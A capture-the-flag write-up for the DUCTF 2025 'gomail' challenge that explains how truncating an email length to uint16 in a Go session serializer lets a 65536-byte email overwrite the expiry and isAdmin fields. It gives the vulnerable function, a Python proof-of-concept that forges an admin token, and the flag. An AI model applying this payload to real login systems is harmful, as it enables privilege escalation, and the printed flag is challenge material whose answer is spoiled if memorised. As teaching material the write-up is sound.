/email checks if our session email is mc-fat@monke.zip and if isAdmin in the session is true.

The vulnerability is in how the session claim object is being serialized.
There is an integer overflow in how the email's length is written to the buffer. Because the email length is casted to uint16 from int, it gets wrapped around (65536 -> 0).

```go
func (ss *SessionSerializer) writeLength(l int) {
    // truncates int to unsigned 16 bit
    el := uint16(l)
    ss.growBuf(2)
    bs := make([]byte, 2)
    binary.LittleEndian.PutUint16(bs, el)
    ss.buf.Write(bs)
}
```

So we can control how the remaining buffer is read for `ss.writeExpiry` and `ss.writeIsAdmin`.

The code expects this:
| 2 bytes strlen | email | 8 bytes expiry | 1 byte isAdmin (needs to be 't') |

PoC
```python
import requests

UNDERFLOW_BYTES = 65536
timestamp = "A"*8
isAdmin = 't'
email = 'mc-fat@monke.zip'
padding = (UNDERFLOW_BYTES - 8 - 1) * 'A'

payload = email + timestamp + isAdmin + padding

URL = 'https://web-gomail-3f344244ceb2.2025.ductf.net/'
payload = {
    'email': payload,
    'password': 'password'
}

r = requests.post(URL+'login', json=payload)
token = r.json().get('token')

headers = {
    'X-Auth-Token': token
}
r = requests.get(URL + 'emails', headers=headers)
print(r.text)
# print(payload)
```

Flag: DUCTF{g0v3rFloW_2_mY_eM41L5!}

Solved by: benkyou